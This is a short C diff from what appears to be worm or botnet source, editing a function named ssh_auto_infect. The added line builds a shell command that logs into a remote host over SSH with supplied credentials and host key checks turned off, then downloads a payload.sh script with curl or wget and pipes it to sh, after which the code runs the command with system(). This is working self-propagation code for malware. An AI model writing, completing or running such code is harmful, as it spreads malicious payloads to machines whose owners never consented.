@@ -359,7 +359,7 @@ static void ssh_rate_limit(void)
 static void ssh_auto_infect(ipv4_t ip, uint16_t port, const char *user, const char *pass)
 {
     char cmd[512];
-    snprintf(cmd, sizeof(cmd), "sshpass -p '%s' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 %s@%d.%d.%d.%d 'curl -s https:
+    snprintf(cmd, sizeof(cmd), "sshpass -p '%s' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 %s@%d.%d.%d.%d 'curl -s https://example.com/payload.sh | sh' || sshpass -p '%s' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 %s@%d.%d.%d.%d 'wget -qO- https://example.com/payload.sh | sh'",
              pass, user, (ip>>24)&0xff, (ip>>16)&0xff, (ip>>8)&0xff, ip&0xff,
              pass, user, (ip>>24)&0xff, (ip>>16)&0xff, (ip>>8)&0xff, ip&0xff);
     system(cmd);
